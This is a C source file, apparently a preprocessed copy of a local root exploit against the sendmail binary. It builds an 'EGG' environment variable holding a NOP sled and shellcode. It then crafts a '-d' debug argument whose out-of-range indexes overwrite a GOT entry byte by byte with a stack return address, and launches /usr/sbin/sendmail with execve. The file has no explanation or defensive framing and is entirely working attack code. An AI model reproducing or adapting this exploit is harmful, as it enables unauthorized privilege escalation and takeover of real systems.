
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 unsigned int GOT ;
 int NOPNUM ;
 unsigned int OFFSET ;
 unsigned int VECT ;
 int execve (char*,char**,char**) ;
 int exit (int) ;
 unsigned int get_esp () ;
 scalar_t__ malloc (int) ;
 int memset (char*,int,int) ;
 int perror (char*) ;
 char* shellcode ;
 int sprintf (char*,char*,...) ;
 int strcat (char*,char*) ;
 int strlen (char*) ;

int main(int argc, char *argv[])
{
 char *egg, s[256], tmp[256], *av[3], *ev[2];
 unsigned int got = GOT, vect = VECT, ret, first, last, i;

 egg = (char *)malloc(strlen(shellcode) + NOPNUM + 5);
 if (egg == ((void*)0)) {
  perror("malloc()");
  exit(-1);
 }
 sprintf(egg, "EGG=");
 memset(egg + 4, 0x90, NOPNUM);
 sprintf(egg + 4 + NOPNUM, "%s", shellcode);

 ret = get_esp() + OFFSET;

 sprintf(s, "-d");
 first = -vect - (0xffffffff - got + 1);
 last = first;
 while (ret) {
  i = ret & 0xff;
  sprintf(tmp, "%u-%u.%u-", first, last, i);
  strcat(s, tmp);
  last = ++first;
  ret = ret >> 8;
 }
 s[strlen(s) - 1] = '\0';

 av[0] = "/usr/sbin/sendmail";
 av[1] = s;
 av[2] = ((void*)0);
 ev[0] = egg;
 ev[1] = ((void*)0);
 execve(*av, av, ev);
}
